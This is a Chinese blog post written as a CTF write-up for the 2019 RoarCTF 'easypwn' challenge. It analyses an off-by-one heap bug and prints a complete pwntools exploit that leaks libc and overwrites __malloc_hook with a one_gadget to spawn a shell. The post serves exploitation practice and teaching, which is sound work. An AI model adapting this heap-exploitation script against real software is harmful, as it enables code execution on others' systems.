---
title: 19RoarCTF记录
author: nepire
avatar: /images/title.ico
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 12:31:01
tags:
keywords:
description:
photos: /images/cover/8.png
---
比赛时正好遇上作业一大堆，粗略的看了一题就去赶作业了，赛后还是来重新看一遍题目




# easypwn
```
    Arch:     amd64-64-little                                                                                          
    RELRO:    Full RELRO                                                                                               
    Stack:    Canary found                                                                                             
    NX:       NX enabled                                                                                               
    PIE:      PIE enabled
```
防护全开
反编译看一下

![图片](jj7Vi0RS28Mu5Vdp.png)

标准菜单框架

然后又是愉快的逆结构体时间

这里就省略分析过程

```
struct note
{
  int inuse;
  int size;
  char *content;
}
```
![图片](3lJTRVXx9hkjDAhf.png)

![图片](ohsQTbMsvZEwjrbO.png)

我们可以看到create的功能只初始化了新chunk，并未往content写东西

然后简单审计过后就能发现有个很僵硬的漏洞

![图片](mnrLbOp5t5EMBjwY.png)

在往chunk_content内写东西时的size是cmp_min的返回值，而问题就出在cmp_min里

![图片](BDqW1RPx5HIeSvgl.png)这里僵硬在于这个额外多出的if，本来猜测可能是想输入的size是带'\n'的但发现这也不对就hen尬

总结下现在得到的可利用点

1.最大可创建size=0x100的chunk

2.edit存在offbyone漏洞

3.菜单选择用的scanf

那么先尝试利用off by one泄露出libc

![图片](3oLNBqRr7Scnt8ZZ.png)


这里有个细节是它没有用malloc创建堆而是calloc，但没必要去纠结，因为触发malloc_hook的不是这里的malloc

![图片](gzXbIS07Uy4a3463.png)


接着就是很直接的，uaf改fd到malloc_hook后把malloc_hook改成one_gadget再用doublefree报错里的malloc触发getshell

```
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./easy_pwn')
elf = ELF('./easy_pwn')
libc = elf.libc
def choice(idx):
	n.recvuntil('choice: ')
	n.sendline(str(idx))


def new(size):
	choice(1)
	n.recvuntil('size: ')
	n.sendline(str(size))


def write(idx,size,content):
	choice(2)
	n.recvuntil('index: ')
	n.sendline(str(idx))
	n.recvuntil('size: ')
	n.sendline(str(size))
	n.recvuntil('content:')
	n.send(content)


def free(idx):
	choice(3)
	n.recvuntil('index: ')
	n.sendline(str(idx))


def show(idx):
	choice(4)
	n.recvuntil('index: ')
	n.sendline(str(idx))


new(0x18)#0
new(0x18)#1
new(0x68)#2
new(0x10)#3
write(0,0x18+10,'a'*0x18+'\x91')
#gdb.attach(n)
free(1)
new(0x18)#1|2
show(2)
libcbase = u64(n.recvuntil('\x7f')[-6:]+'\x00\x00')-0x3c4b78
print hex(libcbase)
malloc_hook = libcbase + libc.sym['__malloc_hook']
one_gadget = libcbase +0xf02a4 
#gdb.attach(n)
free(1)
new(0x68)
free(2)
write(1,0x8,p64(malloc_hook-0x18+5))
new(0x68)
new(0x68)
write(4,0x10+3,'aaa'+p64(one_gadget)*2)
free(2)
free(1)
n.interactive()
```
continue……
